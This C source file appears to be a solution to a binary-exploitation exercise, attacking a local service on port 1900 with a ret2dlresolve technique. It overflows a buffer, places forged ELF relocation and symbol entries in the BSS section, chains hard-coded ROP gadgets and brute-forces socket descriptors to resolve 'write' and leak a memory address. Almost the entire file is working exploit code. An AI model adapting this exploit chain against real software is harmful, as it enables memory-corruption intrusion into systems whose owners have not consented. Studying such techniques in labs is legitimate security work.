//
// Created by loona on 10/28/21.
//
#include <elf.h>
#include <stdio.h>
#include <memory.h>
#include <sys/socket.h>
#include <stdbool.h>
#include <unistd.h>
#include <sys/poll.h>

#include "constants.h"
#include "net.h"

static unsigned long aligin (unsigned long addr) {
    return (0x18 - (addr) % 0x18);
}

bool haveRead(int fd);

int main(void) {
    char buffer[BUFSIZ];
    buffer[0x78] = '\n';

    int bssLoadConnection = connectAndGetSocket("127.0.0.1", 1900);

    pointer fakeRelaPointer = BSS_SECTION + aligin(BSS_SECTION - DTJMPREL);
    printf("%p", fakeRelaPointer);

    pointer fakeSymTabPointer = fakeRelaPointer + sizeof(Elf64_Sym);
    fakeSymTabPointer += aligin(fakeSymTabPointer - DTSYMTAB);
    printf("\n %p", fakeSymTabPointer + 0x18);

    Elf64_Sym fakeSym = {(fakeSymTabPointer + 0x18) - DTSTRTAB, 0x12};
    Elf64_Rela fakeRela = {0x404050, (((fakeSymTabPointer - DTSYMTAB) / 0x18) << 32) | 0x7};

    pointer r15 = 0x004015ca; //0x004015ca pop r15 ; ret  ;  (1 found)
    memcpy(buffer + 0x79, &r15, sizeof(r15));
    buffer[0x81] = '\n';

    memcpy(buffer + 0x82, &fakeRela, sizeof(Elf64_Rela));
    memcpy(buffer + 0xA2, &fakeSym, sizeof(Elf64_Sym));
    memcpy(buffer + 0xBA,"write\x00\x00\x00", 8);
    buffer[0xC2] = '\n';

    send(bssLoadConnection, buffer,0xC3 ,0);
    printf("\n %d", haveRead(bssLoadConnection));

    int brutForce = 0;
    for (int i = 4; i < 100 && !haveRead(bssLoadConnection); ++i) {
        int brutForce = connectAndGetSocket("127.0.0.1", 1900);
        unsigned long *rop = (unsigned long *) (buffer + 0x78);

        *rop++ = 0x004015c8;//0x004015c8 pop r14 ; ret  ;  (1 found)
        *rop++ = 8; //
        *rop++ = 0; //

        *rop++ = 0x004015cb; //0x004015cb mpop rdi ; ret  ;  (1 found);
        *rop++ = i; //

        *rop++ = 0x004015c9; //x004015c9 pop rsi ; pop r15 ; ret  ;  (1 found)
        *rop++ = BSS_SECTION;
        *rop++ = 0; //
        *rop++ = 0x401525; // gets_socket
        *rop++ = 0; //

        *rop++ = 0x004015cb; //0x004015cb mpop rdi ; ret  ;  (1 found);
        *rop++ = i; //

        *rop++ = 0x004015c9; //x004015c9 pop rsi ; pop r15 ; ret  ;  (1 found)
        *rop++ = fakeRelaPointer;
        *rop++ = BSS_SECTION; //
        *rop++ = 0x401525; // gets_socket
        *rop++ = 0; //

        *rop++ = 0x004015a8; //0x004015a8 mov rdx, r14 ; mov rsi, r13 ; mov edi, r12d ; call qword [r15+rbx*8] ;  (1 found)
        *rop++ = 0x004015c9; //x004015c9 pop rsi ; pop r15 ; ret  ;  (1 found)
        *rop++ = 0x00404070;
        *rop++ = 0; //
        *rop++ = 0x004015cb; //0x004015cb mpop rdi ; ret  ;  (1 found);
        *rop++ = i; //
        *rop++ = DL_RESOLVE;
        *rop++ = (fakeRelaPointer - DTJMPREL) / 0x18;
        *rop++ = '\n';

        send(brutForce, buffer, BUFSIZ, 0);
    }
    unsigned long *rop = (unsigned long *) (buffer);

    pointer result = 0;
    read(bssLoadConnection, &result, 8);
    printf("\n %p", result);

    return 0;
}

bool haveRead(int fd) {
    struct pollfd pipeFd = {fd, POLLIN, 0};
    poll(&pipeFd, 1, 100);

    if (pipeFd.revents & POLLIN) {
        return 1;
    }
    return 0;
}
